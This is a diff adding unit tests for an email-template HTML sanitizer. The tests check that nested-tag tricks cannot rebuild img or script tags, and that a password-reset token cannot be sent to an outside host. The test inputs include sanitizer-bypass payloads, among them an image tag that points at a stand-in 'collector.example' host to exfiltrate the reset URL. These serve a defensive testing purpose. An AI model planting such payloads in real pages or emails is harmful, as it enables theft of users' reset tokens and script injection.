@@ -64,3 +64,20 @@ describe("plantillas de correo en fr, de, pt e it", () => {
     expect(render("auth.welcome", "es").html).toContain('<html lang="es">');
   });
 });
+
+describe("sanitizeHtml (plantillas editadas)", async () => {
+  const { sanitizeHtml } = await import("../src/modules/mailer/templates-meta.js");
+  const { renderOverride } = await import("../src/modules/mailer/templates.js");
+  it("no recompone etiquetas al quitar otras (<<x>img ...>)", () => {
+    expect(sanitizeHtml('<<x>img src="https://collector.example/?u={{url}}">')).not.toMatch(/<img/i);
+    expect(sanitizeHtml("<<x>script>alert(1)<<x>/script>")).not.toMatch(/<script/i);
+    expect(sanitizeHtml("<p>Hola <b>Ana</b></p>")).toBe("<p>Hola <b>Ana</b></p>");
+    const r = renderOverride({ subject: "s", title: "t", body_html: '<<x>img src="https://collector.example/?u={{url}}">', body_text: null, cta_label: null, cta_var: null }, { url: "https://descubre.example/reset-password?token=DUMMY" }, "es");
+    expect(r.html).not.toMatch(/<img[^>]*DUMMY/);
+  });
+  it("un enlace con variable sólo se acepta si el href es la variable sola", () => {
+    expect(sanitizeHtml('<a href="https://otro.example/?u={{url}}">x</a>')).toBe("<a>x</a>");
+    expect(sanitizeHtml('<a href="{{url}}">x</a>')).toBe('<a href="{{url}}">x</a>');
+    expect(sanitizeHtml('<a href="https://ok.example/x">x</a>')).toBe('<a href="https://ok.example/x">x</a>');
+  });
+});
